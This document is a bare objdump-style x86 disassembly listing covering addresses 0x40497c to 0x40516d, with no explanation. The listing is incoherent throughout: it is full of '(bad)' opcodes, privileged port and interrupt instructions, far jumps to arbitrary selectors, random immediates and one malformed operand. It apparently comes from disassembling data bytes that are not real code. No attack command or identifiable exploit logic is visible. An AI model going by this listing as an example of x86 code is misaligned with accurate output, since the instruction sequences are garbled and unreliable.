  40497c:	or     esp,eax
  40497e:	leave  
  40497f:	mov    ds:0x2d95eb68,eax
  404984:	(bad)  
  404985:	lock cmp bh,cl
  404988:	fnstsw WORD PTR [ebp+0xc]
  40498b:	sar    BYTE PTR [ebp+eiz*8-0x3f],0x5c
  404990:	ins    DWORD PTR es:[edi],dx
  404991:	cli    
  404992:	in     eax,dx
  404993:	fidivr DWORD PTR [edi]
  404995:	mov    dl,0x63
  404997:	pop    ebp
  404998:	and    dh,bl
  40499a:	push   ecx
  40499b:	sbb    eax,0xde31ae29
  4049a0:	popf   
  4049a1:	xchg   esp,eax
  4049a2:	iret   
  4049a3:	push   eax
  4049a4:	inc    edx
  4049a5:	std    
  4049a6:	into   
  4049a7:	aad    0x36
  4049a9:	out    dx,eax
  4049aa:	sub    eax,0xf625cbdc
  4049af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b0:	xchg   esp,eax
  4049b1:	icebp  
  4049b2:	pop    es
  4049b3:	adc    eax,0x4009a721
  4049b8:	jnp    0x404944
  4049ba:	gs mov edi,0xb23d847c
  4049c0:	or     al,0x59
  4049c3:	jno    0x4049ba
  4049c5:	jl     0x4049fb
  4049c7:	pop    esi
  4049c8:	test   DWORD PTR ds:0x8ac41e1d,0x4bbde8ac
  4049d2:	cmp    dh,al
  4049d4:	es xchg esp,eax
  4049d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d7:	pop    esp
  4049d8:	mov    ch,bl
  4049da:	or     edx,DWORD PTR [ebp+ebp*4+0x4]
  4049de:	ret    0x17d4
  4049e1:	lds    edi,FWORD PTR [esi+0xa]
  4049e4:	or     DWORD PTR [esi-0x54],ebx
  4049e7:	lock xchg edx,eax
  4049e9:	shl    BYTE PTR [edi-0x66],0xb3
  4049ed:	aaa    
  4049ee:	and    eax,0x7c596418
  4049f3:	add    eax,0x40961d41
  4049f8:	std    
  4049f9:	lods   al,BYTE PTR ds:[esi]
  4049fa:	lds    esi,FWORD PTR [ebp+0x57]
  4049fd:	add    bh,cl
  4049ff:	push   DWORD PTR [esi+ebx*2]
  404a02:	aaa    
  404a03:	ins    DWORD PTR es:[edi],dx
  404a04:	pusha  
  404a05:	sbb    BYTE PTR [ecx+0x71],dh
  404a08:	xor    edx,DWORD PTR [ebp+0x246f1305]
  404a0e:	aam    0x8c
  404a10:	or     eax,0x7fe5b286
  404a15:	out    dx,eax
  404a16:	xor    DWORD PTR [edx-0x30],ecx
  404a19:	retf   
  404a1a:	nop
  404a1b:	aad    0x9
  404a1d:	ja     0x404a92
  404a1f:	xor    ebp,DWORD PTR [ecx]
  404a21:	arpl   sp,cx
  404a23:	jnp    0x4049ac
  404a25:	add    bl,0xa0
  404a28:	leave  
  404a29:	adc    ch,BYTE PTR [edx-0x15e9250]
  404a2f:	push   0x1a3d8ac
  404a34:	leave  
  404a35:	cs (bad) 
  404a37:	cmc    
  404a38:	xchg   esi,eax
  404a39:	inc    eax
  404a3a:	xor    eax,0x98d332ba
  404a3f:	in     al,dx
  404a40:	inc    edi
  404a41:	xchg   edi,eax
  404a42:	xchg   esp,eax
  404a43:	jnp    0x404aaf
  404a45:	push   0xaa272b9f
  404a4a:	xchg   ebp,eax
  404a4b:	dec    ebx
  404a4c:	push   ecx
  404a4d:	lods   al,BYTE PTR ds:[esi]
  404a4e:	test   al,0xb3
  404a50:	dec    ebx
  404a51:	or     eax,0x35a44ed0
  404a56:	mov    WORD PTR [edi],ss
  404a58:	or     al,0x9f
  404a5a:	aam    0x68
  404a5c:	and    BYTE PTR [ecx],bh
  404a5e:	in     al,0x3b
  404a60:	mov    edx,0x63b32f98
  404a65:	inc    ebp
  404a66:	or     DWORD PTR [eax+0x2f],ecx
  404a69:	arpl   WORD PTR [edi-0x4a466333],bx
  404a6f:	fild   QWORD PTR [ecx+eax*8+0x25dddb88]
  404a76:	arpl   bx,bx
  404a78:	retf   
  404a79:	push   ecx
  404a7a:	cld    
  404a7b:	add    edx,DWORD PTR [esi+0x74]
  404a7e:	popa   
  404a7f:	adc    DWORD PTR [esi+ebx*1],0x6f0286a
  404a86:	or     esp,DWORD PTR [edx+esi*2-0x58]
  404a8a:	xor    al,BYTE PTR [edx]
  404a8c:	pop    esp
  404a8d:	mov    ds:0xf35ab66c,al
  404a92:	push   edi
  404a93:	inc    esp
  404a94:	inc    edx
  404a95:	rol    DWORD PTR [eax-0x32],0x83
  404a99:	dec    edx
  404a9a:	jecxz  0x404a88
  404a9c:	adc    al,0x7b
  404a9e:	imul   esp,DWORD PTR [ebp+0xc923f79],0xf4313e64
  404aa8:	sbb    ecx,DWORD PTR [ebx+ecx*8+0x4d094b43]
  404aaf:	loope  0x404aea
  404ab1:	jmp    0xfda340e1
  404ab6:	mov    ds:0xd5cad3a9,al
  404abb:	fdivr  DWORD PTR [edi+0x3645ea81]
  404ac1:	retf   
  404ac2:	shl    DWORD PTR [edi],1
  404ac4:	stc    
  404ac5:	cdq    
  404ac6:	js     0x404b07
  404ac8:	popa   
  404ac9:	jns    0x404b47
  404acb:	mov    fs,WORD PTR [ebp+0x3e8aa3f3]
  404ad1:	or     BYTE PTR [eax-0x161c49e3],al
  404ad7:	push   ebp
  404ad8:	or     ebx,ecx
  404ada:	mov    dh,0xf
  404adc:	push   ss
  404add:	sub    BYTE PTR ds:0x122b05c8,cl
  404ae3:	jl     0x404a67
  404ae5:	dec    ebp
  404ae6:	sub    al,0xa0
  404ae8:	arpl   WORD PTR [eax-0x7f],si
  404aeb:	add    DWORD PTR [ebp+0x322c8a86],edi
  404af1:	mov    esi,ebx
  404af3:	hlt    
  404af4:	neg    BYTE PTR [eax-0x310c0975]
  404afa:	or     esp,esi
  404afc:	mov    al,BYTE PTR [edx+0x69]
  404aff:	pop    edx
  404b00:	mov    eax,0x3d21ef60
  404b05:	iret   
  404b06:	fs pop edx
  404b08:	ds mov esp,0x35c66910
  404b0e:	cmp    BYTE PTR [ebx-0x30],cl
  404b11:	cdq    
  404b12:	xchg   DWORD PTR [edi+0x4a318561],edx
  404b18:	sti    
  404b19:	cmc    
  404b1a:	pop    ebx
  404b1b:	pop    ss
  404b1c:	bound  esp,QWORD PTR [esi-0x54]
  404b1f:	ror    dh,cl
  404b21:	or     ah,bl
  404b23:	jo     0x404ae3
  404b25:	fmulp  st(4),st
  404b27:	lahf   
  404b28:	inc    eax
  404b29:	cmp    DWORD PTR ds:0x937f2dbd,eax
  404b2f:	or     BYTE PTR [ecx+0x6c],ah
  404b32:	dec    ebp
  404b33:	dec    ebx
  404b34:	mov    ss,WORD PTR [ebp+0x59]
  404b37:	pop    ebp
  404b38:	pop    edi
  404b39:	fcomi  st,st(4)
  404b3b:	sahf   
  404b3c:	enter  0xa925,0x86
  404b40:	int    0xce
  404b42:	(bad)  
  404b44:	mov    bl,0x47
  404b46:	in     eax,0x6d
  404b48:	mov    bl,BYTE PTR [edx-0x171f5a66]
  404b4e:	idiv   DWORD PTR [esi+ebx*8-0x25]
  404b52:	sub    DWORD PTR [ebx+0x6037252b],esi
  404b58:	jne    0x404b82
  404b5a:	mov    ah,0x1b
  404b5c:	mov    ebx,esi
  404b5e:	push   esp
  404b5f:	xchg   DWORD PTR [esp+eax*1],ecx
  404b62:	scas   eax,DWORD PTR es:[edi]
  404b63:	push   ebx
  404b64:	xchg   DWORD PTR [eax+0x3c],ebp
  404b67:	mov    eax,ds:0x8cc96fed
  404b6c:	or     BYTE PTR [ecx-0x708ab0cb],0x5f
  404b73:	sub    eax,0x4e6a8c21
  404b78:	inc    ebx
  404b79:	jbe    0x404bc2
  404b7b:	inc    esp
  404b7c:	in     al,dx
  404b7d:	pusha  
  404b7e:	dec    esp
  404b7f:	cli    
  404b80:	pushf  
  404b81:	and    cl,bl
  404b83:	and    ecx,DWORD PTR [edx-0x3]
  404b86:	xor    ecx,ebx
  404b88:	hlt    
  404b89:	xlat   BYTE PTR ds:[ebx]
  404b8a:	fimul  DWORD PTR [edx]
  404b8c:	add    ebx,0xe
  404b8f:	into   
  404b90:	dec    esi
  404b91:	xor    dh,BYTE PTR [edi+esi*1+0x2ebd24c9]
  404b98:	push   ss
  404b99:	push   es
  404b9a:	cld    
  404b9b:	aas    
  404b9c:	mov    gs,esp
  404b9e:	adc    esi,edx
  404ba0:	xor    DWORD PTR [edx-0x25],ecx
  404ba3:	ins    DWORD PTR es:[edi],dx
  404ba4:	(bad)  
  404ba5:	mov    ds:0x478f951a,eax
  404baa:	(bad)  
  404bab:	or     DWORD PTR [edi+edi*8],eax
  404bae:	lods   eax,DWORD PTR ds:[esi]
  404baf:	xor    al,0x8d
  404bb1:	scas   eax,DWORD PTR es:[edi]
  404bb2:	push   ds
  404bb3:	mov    ds:0xc9d63491,al
  404bb8:	sahf   
  404bb9:	mov    edx,0xc74d3707
  404bbe:	jne    0x404c22
  404bc0:	fwait
  404bc1:	mov    ds:0x5b34bc40,al
  404bc6:	test   BYTE PTR [eax+ecx*2-0x4b],ch
  404bca:	sbb    BYTE PTR [edi],0xa8
  404bcd:	data16 xor al,dh
  404bd0:	inc    BYTE PTR [esi-0x1e55d5d5]
  404bd6:	popf   
  404bd7:	loop   0x404bea
  404bd9:	cmp    eax,0x2055f22
  404bde:	icebp  
  404bdf:	inc    eax
  404be0:	call   0x269:0x8e7c9a35
  404be7:	cld    
  404be8:	dec    esi
  404be9:	jnp    0x404c5c
  404beb:	scas   eax,DWORD PTR es:[edi]
  404bec:	arpl   WORD PTR ds:0x4c94e0ef,cx
  404bf2:	sub    al,0x2
  404bf4:	inc    edi
  404bf5:	inc    ecx
  404bf6:	enter  0x4c1c,0xf3
  404bfa:	or     bh,BYTE PTR [edi-0x20]
  404bfd:	pop    eax
  404bfe:	rcr    BYTE PTR [ebx+edx*4+0x28],0xca
  404c03:	mov    WORD PTR [eax+ebx*1-0xac94ae4],di
  404c0b:	(bad)  
  404c0c:	jg     0x404c55
  404c0e:	repz out 0x30,eax
  404c11:	xchg   esp,eax
  404c12:	div    DWORD PTR [ebp+0x35]
  404c15:	mov    WORD PTR [ecx],cs
  404c17:	and    al,0x22
  404c19:	mov    dh,0x73
  404c1b:	mov    BYTE PTR [edx],dh
  404c1d:	inc    esp
  404c1e:	pop    ds
  404c1f:	sar    DWORD PTR ds:0x5da4adc3,cl
  404c25:	dec    eax
  404c26:	mul    BYTE PTR [edx-0x34]
  404c29:	(bad)
  404c2d:	push   0x1a
  404c2f:	repnz (bad)
  404c32:	aaa    
  404c33:	popf   
  404c34:	stos   DWORD PTR es:[edi],eax
  404c35:	cmc    
  404c36:	push   ss
  404c37:	xchg   edi,eax
  404c38:	jge    0x404c81
  404c3a:	push   ds
  404c3b:	xchg   edx,eax
  404c3c:	or     bl,al
  404c3e:	adc    ebx,DWORD PTR [edi+0xec6bfc5]
  404c44:	push   0x6a2367b
  404c49:	cmp    DWORD PTR [ebx+0x459509ab],ebx
  404c4f:	xor    ah,BYTE PTR [ebx]
  404c51:	(bad)  
  404c52:	fisttp DWORD PTR ds:0x9c4560e
  404c58:	jl     0x404c04
  404c5a:	sub    esi,DWORD PTR [ecx+0x4c317c3c]
  404c60:	or     eax,0xbe96157d
  404c65:	clc    
  404c66:	jno    0x404c0d
  404c68:	xchg   edi,eax
  404c69:	sub    BYTE PTR [edx+0x34],al
  404c6c:	lods   eax,DWORD PTR ds:[esi]
  404c6d:	out    dx,eax
  404c6e:	into   
  404c6f:	push   ebp
  404c70:	push   ebp
  404c71:	xor    BYTE PTR [edi],0xde
  404c74:	popf   
  404c75:	pop    esp
  404c76:	sar    DWORD PTR ds:0x9a5566cd,0xce
  404c7d:	shl    BYTE PTR [edi*2-0x76851604],0x5b
  404c85:	mov    ds:0x946435ef,al
  404c8a:	jo     0x404c85
  404c8c:	sahf   
  404c8d:	call   0x5db007ed
  404c92:	rol    dh,cl
  404c94:	mov    ebp,0x74c29139
  404c99:	lock (bad) 
  404c9b:	std    
  404c9c:	bound  ebp,QWORD PTR [eax]
  404c9e:	test   eax,0xb7b2a9e8
  404ca3:	push   cs
  404ca4:	inc    edx
  404ca5:	lds    ebx,FWORD PTR [edi]
  404ca7:	jg     0x404c82
  404ca9:	shl    BYTE PTR [eax],0x3e
  404cac:	adc    eax,0x7eb7950a
  404cb1:	adc    eax,0xd3bdbbbe
  404cb6:	jmp    0xa4af:0xb8db9585
  404cbd:	pop    edi
  404cbe:	mov    WORD PTR [edi-0xf],ss
  404cc1:	adc    eax,0x8a00d8af
  404cc6:	shl    DWORD PTR ds:0x8ac3b201,0x7a
  404ccd:	ret    0xba26
  404cd0:	push   edx
  404cd1:	adc    DWORD PTR [edx],0x75
  404cd4:	and    BYTE PTR [ebx+0x28224],cl
  404cda:	test   al,0x4f
  404cdc:	jmp    0x8bc:0xe35bf560
  404ce3:	(bad)  [ebp+0x77]
  404ce6:	test   eax,0x46637608
  404ceb:	shr    DWORD PTR [ecx],1
  404ced:	sbb    eax,0x39e6681b
  404cf2:	cmp    ah,bl
  404cf4:	jne    0x404d02
  404cf6:	pop    ds
  404cf7:	imul   ecx,DWORD PTR [ebx-0x22],0x6a76adda
  404cfe:	inc    esi
  404cff:	rol    DWORD PTR [esp+esi*2+0x2cdad341],1
  404d06:	loopne 0x404d2f
  404d08:	mov    cs,WORD PTR [ebp+0x69]
  404d0b:	lahf   
  404d0c:	(bad)  
  404d0d:	adc    DWORD PTR [ebx+edi*2+0x4e],esp
  404d11:	out    dx,eax
  404d12:	add    DWORD PTR [ebx],ecx
  404d14:	nop
  404d15:	xor    edx,DWORD PTR [ebx]
  404d17:	fisttp QWORD PTR [esi-0x1e]
  404d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d1b:	jb     0x404d4c
  404d1d:	ja     0x404d3e
  404d1f:	cmp    eax,edi
  404d21:	sti    
  404d22:	inc    ebp
  404d23:	ret    
  404d24:	sub    ah,BYTE PTR [ecx-0x20]
  404d27:	popf   
  404d28:	cmp    eax,0x73e0ba06
  404d2d:	jne    0x404d24
  404d2f:	xchg   esp,eax
  404d30:	dec    edi
  404d31:	int    0x39
  404d33:	cmc    
  404d34:	sahf   
  404d35:	loopne 0x404cd5
  404d37:	mov    WORD PTR [edx+0x4ac6e677],ss
  404d3d:	or     al,0x5a
  404d3f:	mov    bh,0x5d
  404d41:	ja     0x404ce6
  404d43:	mov    ch,0x47
  404d45:	mov    dl,0x20
  404d47:	in     eax,0xde
  404d49:	loop   0x404d2e
  404d4b:	mov    ebp,0xa347eabf
  404d50:	imul   eax,DWORD PTR [ecx-0x67],0x3c
  404d54:	mov    eax,0x95bf09d
  404d59:	int3   
  404d5a:	jecxz  0x404d4c
  404d5c:	mov    esi,ebx
  404d5e:	add    al,BYTE PTR [edx-0x53]
  404d61:	push   0x9
  404d63:	repz xchg edx,eax
  404d65:	xor    eax,0x4d31627e
  404d6a:	inc    eax
  404d6b:	bound  eax,QWORD PTR [edx-0x12752fe7]
  404d71:	leave  
  404d72:	jp     0x404d7b
  404d74:	mov    ebx,0x2ff88461
  404d79:	out    0x7,al
  404d7b:	xchg   esi,eax
  404d7c:	fdivr  QWORD PTR [edi+0x5e493a71]
  404d82:	mov    ss,WORD PTR [eax+0x472bdd85]
  404d88:	xlat   BYTE PTR ds:[ebx]
  404d89:	fild   DWORD PTR [edi+0x3e33bda]
  404d8f:	fstp   QWORD PTR [ebx]
  404d91:	repnz adc esi,ebx
  404d94:	fcom   QWORD PTR [edx-0x42a9f6da]
  404d9a:	and    eax,0xc841fca6
  404d9f:	pop    esi
  404da0:	test   BYTE PTR [esi],0x35
  404da3:	mov    al,ds:0x73d84a53
  404da8:	jbe    0x404dc3
  404daa:	xchg   ebx,eax
  404dab:	mov    ?,WORD PTR [esi+edx*1-0x308b8f19]
  404db2:	icebp  
  404db3:	ror    ebp,cl
  404db5:	ror    BYTE PTR [ebx-0x64],0x17
  404db9:	repz imul edx,ecx,0xc1bf650c
  404dc0:	psrlq  mm4,mm5
  404dc3:	(bad)  
  404dc5:	shl    DWORD PTR [esi-0x75],0x45
  404dc9:	sbb    DWORD PTR [edi+0x78],ebp
  404dcc:	pop    ds
  404dcd:	fisubr WORD PTR [eax+0x19fa51e0]
  404dd3:	ficom  WORD PTR [eax]
  404dd5:	and    BYTE PTR [ebx-0x5ff3f5c8],cl
  404ddb:	jns    0x404d8b
  404ddd:	icebp  
  404dde:	ja     0x404da8
  404de0:	and    al,0x4f
  404de2:	xchg   ebp,eax
  404de3:	pop    esi
  404de4:	cs addr16 sahf 
  404de7:	inc    esi
  404de8:	imul   DWORD PTR [ebx+0x52116e71]
  404dee:	jecxz  0x404dac
  404df0:	pop    esp
  404df1:	imul   ebx,DWORD PTR [ebx+0x6aa4b062],0xffffffc9
  404df8:	pop    es
  404df9:	mov    eax,0x897e29f7
  404dfe:	cs stos BYTE PTR es:[edi],al
  404e00:	and    BYTE PTR [ebx-0x5e],cl
  404e03:	dec    edx
  404e04:	pop    ebx
  404e05:	jne    0x404e10
  404e07:	jge    0x404e15
  404e09:	jbe    0x404dbd
  404e0b:	jnp    0x404db9
  404e0d:	shr    BYTE PTR [edi],0x58
  404e10:	fstp   QWORD PTR [esi]
  404e12:	cmp    bh,BYTE PTR [esi+0x62]
  404e15:	xlat   BYTE PTR ds:[ebx]
  404e16:	adc    eax,0x1fe096de
  404e1b:	iret   
  404e1c:	inc    bl
  404e1e:	test   cl,cl
  404e20:	into   
  404e21:	cmp    esp,DWORD PTR [eax-0x2954b784]
  404e27:	cs enter 0x94e7,0x3d
  404e2c:	arpl   bp,cx
  404e2e:	mov    eax,0x32a1594d
  404e33:	or     ch,bl
  404e35:	pop    es
  404e36:	jge    0x404e88
  404e38:	int    0x2c
  404e3a:	hlt    
  404e3b:	(bad)  
  404e3d:	xlat   BYTE PTR ds:[ebx]
  404e3e:	lods   al,BYTE PTR ds:[esi]
  404e3f:	push   ecx
  404e40:	inc    edx
  404e41:	(bad)  
  404e42:	sahf   
  404e43:	shr    DWORD PTR [esi+0x5e],0x30
  404e47:	dec    ecx
  404e48:	test   BYTE PTR [esi-0x26],dh
  404e4b:	(bad)  
  404e4c:	sbb    BYTE PTR es:[edx],al
  404e4f:	(bad)  
  404e50:	pop    ss
  404e51:	push   ds
  404e52:	and    al,bl
  404e54:	jge    0x404e7f
  404e56:	dec    edx
  404e57:	jg     0x404e9f
  404e59:	or     al,0x4f
  404e5b:	jae    0x404e29
  404e5d:	or     BYTE PTR [ebx+eiz*8-0x42],dh
  404e61:	push   cs
  404e62:	and    ch,ah
  404e64:	jne    0x404eb7
  404e66:	xor    DWORD PTR [edi+0x0],ebx
  404e69:	cmp    ah,BYTE PTR [ebp+0x4c9ba4a]
  404e6f:	mov    eax,0xdbc0e176
  404e74:	stos   BYTE PTR es:[edi],al
  404e75:	jo     0x404eb5
  404e77:	cmp    edi,edx
  404e79:	and    eax,0xa7e619e7
  404e7e:	add    cl,BYTE PTR [ecx-0x29658bcc]
  404e84:	sub    al,0xf4
  404e86:	leave  
  404e87:	adc    ah,BYTE PTR [ebp-0x11]
  404e8a:	mov    ds:0xf8c08949,eax
  404e8f:	pop    esp
  404e90:	push   edx
  404e91:	int    0x6
  404e93:	mov    edx,ss
  404e95:	cmp    DWORD PTR [eax],esi
  404e97:	ret    
  404e98:	sti    
  404e99:	jns    0x404ebf
  404e9b:	xor    DWORD PTR [ecx],ebp
  404e9d:	cdq    
  404e9e:	dec    ebp
  404e9f:	mov    bh,0x7e
  404ea1:	mov    DWORD PTR [ecx+0x2a],ebx
  404ea4:	xor    bl,BYTE PTR [ebx+edx*2+0x6a043887]
  404eab:	enter  0xb552,0x2
  404eaf:	push   ss
  404eb0:	jp     0x404ece
  404eb2:	fs stos BYTE PTR es:[edi],al
  404eb4:	fs push 0xffffff97
  404eb7:	jg     0x404ee1
  404eb9:	rcr    DWORD PTR [eax],0x77
  404ebc:	sar    BYTE PTR [ebx+0x2a1578d4],cl
  404ec2:	mov    esi,DWORD PTR [eax+esi*4]
  404ec5:	pop    ebx
  404ec6:	pop    ss
  404ec7:	aas    
  404ec8:	leave  
  404ec9:	push   esp
  404eca:	and    eax,0x8a6d29c0
  404ecf:	out    0x7b,al
  404ed1:	add    eax,0x9ed0e2ff
  404ed6:	push   ds
  404ed7:	les    ebp,FWORD PTR [edx+0x463c0724]
  404edd:	in     eax,0x2e
  404edf:	(bad)
  404ee2:	jne    0x404f58
  404ee4:	cmp    BYTE PTR [esi-0x78],dl
  404ee7:	jae    0x404f50
  404ee9:	pop    ebx
  404eea:	xchg   ebx,eax
  404eeb:	lahf   
  404eec:	mov    dl,0x19
  404eee:	nop
  404eef:	(bad)  
  404ef0:	ja     0x404f1d
  404ef2:	icebp  
  404ef3:	inc    ecx
  404ef4:	ret    
  404ef5:	mov    ecx,0x38ee692a
  404efa:	rcr    ebp,1
  404efc:	aas    
  404efd:	das    
  404efe:	mov    ch,0x1a
  404f00:	and    bh,dl
  404f02:	mov    bh,BYTE PTR [edx-0xfee2c8a]
  404f08:	jle    0x404ea6
  404f0a:	(bad)  
  404f0c:	jb     0x404f5b
  404f0e:	pop    edi
  404f0f:	mov    esi,0x3f4e666c
  404f14:	into   
  404f15:	clc    
  404f16:	jo     0x404ebf
  404f18:	sub    al,0x1f
  404f1a:	lds    edi,FWORD PTR [ecx]
  404f1c:	fs retf 0x1b6c
  404f20:	lods   al,BYTE PTR ds:[esi]
  404f21:	cmp    edx,DWORD PTR [ecx]
  404f23:	cdq    
  404f24:	pop    esi
  404f25:	(bad)  
  404f26:	jns    0x404eba
  404f28:	(bad)  
  404f29:	cmp    eax,0xe18f25df
  404f2e:	pop    esi
  404f2f:	fidiv  DWORD PTR [ecx+ebx*2-0x797c37e2]
  404f36:	loopne 0x404f5f
  404f38:	dec    ebp
  404f39:	mov    ecx,0x2ba3841d
  404f3e:	xor    esi,DWORD PTR [ebp+ecx*2+0x20]
  404f42:	hlt    
  404f43:	lahf   
  404f44:	xor    al,0x35
  404f46:	and    eax,0xe8e321ab
  404f4b:	fucomip st,st(2)
  404f4d:	(bad)  
  404f4e:	shl    BYTE PTR [edi+0x7f],0xea
  404f52:	pop    edx
  404f53:	push   esi
  404f54:	idiv   DWORD PTR [ebx]
  404f56:	push   0xffffffe6
  404f58:	xchg   ebx,eax
  404f59:	imul   eax,esi,0xffffffdf
  404f5c:	neg    BYTE PTR ds:0xd9b707a4
  404f62:	retf   0xc1c0
  404f65:	cmp    DWORD PTR [edx],edx
  404f67:	rcl    edx,cl
  404f69:	out    dx,eax
  404f6a:	mov    cs,WORD PTR [esi]
  404f6c:	comiss xmm7,DWORD PTR [eax+0x1dc86812]
  404f73:	or     al,BYTE PTR [ebp-0x22ee33e5]
  404f79:	and    esi,esi
  404f7b:	jbe    0x404f65
  404f7d:	xlat   BYTE PTR ds:[ebx]
  404f7e:	xor    BYTE PTR [ecx-0x38],0x3e
  404f82:	xchg   DWORD PTR [eax-0x42da3cf9],edi
  404f88:	lahf   
  404f89:	je     0x404f17
  404f8b:	call   0x84e32c06
  404f90:	inc    esp
  404f91:	data16 int 0xdf
  404f94:	mov    edi,0xcc92aa1
  404f99:	ret    
  404f9a:	gs pop ss
  404f9c:	push   ebp
  404f9d:	bound  edi,QWORD PTR [ecx]
  404f9f:	dec    edi
  404fa0:	pop    eax
  404fa1:	lods   eax,DWORD PTR ds:[esi]
  404fa2:	int    0x72
  404fa4:	pop    ebx
  404fa5:	enter  0xa014,0xcc
  404fa9:	sub    ebx,DWORD PTR [eax-0xe]
  404fac:	outs   dx,DWORD PTR ds:[esi]
  404fad:	mov    cl,0xae
  404faf:	mov    bl,BYTE PTR [ecx+0x62bde1a8]
  404fb5:	inc    esp
  404fb6:	and    al,0x8a
  404fb8:	cmp    eax,0xf6771dc7
  404fbd:	cmp    edi,esp
  404fbf:	shr    DWORD PTR [edx+0x41],0x2f
  404fc3:	jbe    0x405031
  404fc5:	xchg   ebp,eax
  404fc6:	rcr    BYTE PTR ds:0xfb699a98,cl
  404fcc:	push   ss
  404fcd:	stc    
  404fce:	out    dx,eax
  404fcf:	cmp    ebp,ebx
  404fd1:	mov    cl,0x61
  404fd3:	jae    0x404fd8
  404fd5:	cmp    al,0xbb
  404fd7:	(bad)
  404fdc:	test   eax,0x4b4efe
  404fe1:	cmp    BYTE PTR [ebx+0x3],al
  404fe4:	add    DWORD PTR [eax+0x16],ebx
  404fe7:	push   0xffffff80
  404fe9:	or     DWORD PTR [edi+0x3e4da416],ecx
  404fef:	jge    0x405004
  404ff1:	imul   DWORD PTR [ebx+0x62]
  404ff4:	push   edi
  404ff5:	addr16 jbe 0x405010
  404ff8:	xor    ch,ah
  404ffa:	scas   al,BYTE PTR es:[edi]
  404ffb:	imul   ebx,DWORD PTR fs:[eax],0xbeca4d8c
  405002:	dec    ebx
  405003:	pop    es
  405004:	std    
  405005:	aad    0xd6
  405007:	and    esp,ebx
  405009:	sbb    edx,DWORD PTR [edi-0x63]
  40500c:	or     ah,BYTE PTR [ebx]
  40500e:	xchg   esi,eax
  40500f:	xor    eax,0x3c028874
  405014:	jne    0x404fa5
  405016:	or     al,0x56
  405018:	in     al,0x8a
  40501a:	adc    BYTE PTR [ebx-0x67d85103],ch
  405020:	mov    cl,0x92
  405022:	fcom   QWORD PTR [ebp-0x77]
  405025:	aas    
  405026:	jbe    0x40505f
  405028:	xor    DWORD PTR [ebp+0x2a6b26d2],ebx
  40502e:	inc    edx
  40502f:	dec    esi
  405030:	adc    dh,BYTE PTR [edx+0x19]
  405033:	call   0xa218:0xd3a9a2dd
  40503a:	jmp    0x7adecbc2
  40503f:	jp     0x405047
  405041:	int    0x15
  405043:	repz test eax,0xa2af5ca4
  405049:	scas   al,BYTE PTR es:[edi]
  40504a:	xor    esp,eax
  40504c:	(bad)  
  40504f:	mov    BYTE PTR [edi+0x6d8e9671],al
  405055:	cmp    edi,DWORD PTR [eax]
  405057:	pop    esp
  405058:	xchg   esi,eax
  405059:	bnd je 0x40502d
  40505c:	pop    esi
  40505d:	mov    edi,0xab711e64
  405062:	push   0x8e26012f
  405067:	push   ecx
  405068:	(bad)  
  405069:	fimul  WORD PTR [ebp+0x32136f5d]
  40506f:	inc    esp
  405070:	push   ds
  405071:	add    BYTE PTR [edi+0x7d],0x54
  405075:	ins    BYTE PTR es:[edi],dx
  405076:	stc    
  405077:	lahf   
  405078:	cmp    DWORD PTR [edx],edx
  40507a:	sbb    BYTE PTR [ebx+ebx*4-0x3f],0x1c
  40507f:	ret    
  405080:	sbb    ebp,ecx
  405082:	mov    al,BYTE PTR [ebx+edx*2+0x76]
  405086:	mov    DWORD PTR [edi+0x2a846409],0xb72874a9
  405090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405091:	add    eax,0x3344315d
  405096:	dec    ah
  405098:	mov    ecx,0x2a553a02
  40509d:	clc    
  40509e:	cmp    eax,0x5e9b5346
  4050a3:	mov    esp,ebp
  4050a5:	push   ss
  4050a6:	add    al,0x8b
  4050a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050a9:	cli    
  4050aa:	xor    ebx,DWORD PTR [edi+0x14648a77]
  4050b0:	push   DWORD PTR [edi]
  4050b2:	rcr    BYTE PTR [esi-0x60562c9f],cl
  4050b8:	addr16 cwde 
  4050ba:	out    0xef,al
  4050bc:	(bad)  
  4050bd:	out    0x5a,al
  4050bf:	aad    0xf
  4050c1:	sbb    edi,esi
  4050c3:	sub    eax,0x376864a0
  4050c8:	push   cs
  4050c9:	inc    eax
  4050ca:	xlat   BYTE PTR ds:[ebx]
  4050cb:	mov    DWORD PTR [edi-0x3ce45f14],ebx
  4050d1:	repz push 0x35
  4050d4:	jmp    0xf721141a
  4050d9:	push   esi
  4050da:	add    bl,ah
  4050dc:	cwde   
  4050dd:	aaa    
  4050de:	and    ecx,DWORD PTR [ecx-0x418b2292]
  4050e4:	mov    cl,BYTE PTR [edi-0x7d2f0097]
  4050ea:	mov    DWORD PTR [edx+0x3e3736d5],ebp
  4050f0:	mov    cl,0x7d
  4050f2:	test   eax,0xa89a2bd6
  4050f7:	das    
  4050f8:	into   
  4050f9:	fidiv  DWORD PTR [edx+0x43]
  4050fc:	ret    
  4050fd:	cmp    bh,0x2
  405100:	xor    BYTE PTR ds:0x52dbcf77,al
  405106:	ror    BYTE PTR ss:[eax+esi*2+0x4e],0xdd
  40510c:	pop    esp
  40510d:	daa    
  40510e:	bound  edi,QWORD PTR gs:[edx+0x26006a8c]
  405115:	xchg   ecx,eax
  405116:	xor    DWORD PTR [edi+ecx*1-0x4],0x3ce61269
  40511e:	arpl   bp,bx
  405120:	rcl    al,0x9
  405123:	ds add eax,0xd20d31ca
  405129:	pop    es
  40512a:	daa    
  40512b:	cmp    DWORD PTR [eax+0x67],ebp
  40512e:	push   ds
  40512f:	pop    esi
  405130:	jecxz  0x405100
  405132:	lods   al,BYTE PTR ds:[esi]
  405133:	aam    0x36
  405135:	out    dx,al
  405136:	mov    esp,0x8fa8958c
  40513b:	les    ebp,FWORD PTR [ebx]
  40513d:	bound  esp,QWORD PTR [esi+ebx*4-0x33]
  405141:	ins    BYTE PTR es:[edi],dx
  405142:	stc    
  405143:	(bad)  
  405144:	repz enter 0x3a5e,0x3
  405149:	pop    es
  40514a:	adc    ebx,edi
  40514c:	das    
  40514d:	in     eax,dx
  40514e:	mov    edx,0x234eae6f
  405153:	daa    
  405154:	dec    eax
  405155:	ja     0x40518b
  405157:	test   DWORD PTR [edi+0x78],ebp
  40515a:	fstp   DWORD PTR [ebx-0x76c9b329]
  405160:	dec    eax
  405161:	inc    edi
  405162:	jmp    0x1e9e2b08
  405167:	sar    BYTE PTR [ecx+0x49e95870],cl
  40516d:	mov    eax,0x3c875264
